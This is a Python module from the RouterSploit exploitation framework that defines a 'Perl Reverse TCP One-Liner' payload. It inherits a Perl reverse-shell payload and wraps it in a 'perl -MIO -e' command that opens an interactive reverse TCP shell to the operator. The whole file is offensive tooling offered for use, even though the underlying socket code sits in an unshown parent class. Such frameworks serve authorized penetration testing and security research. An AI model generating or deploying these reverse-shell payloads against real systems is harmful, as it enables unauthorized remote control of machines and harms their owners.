from routersploit.core.exploit import *
from routersploit.modules.payloads.perl.reverse_tcp import Payload as PerlReverseTCP


class Payload(PerlReverseTCP):
    __info__ = {
        "name": "Perl Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using perl one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    cmd = OptString("perl", "Perl binary")

    def generate(self):
        payload = super(Payload, self).generate()

        cmd = "{} -MIO -e \"{}\"".format(self.cmd, payload)
        return cmd
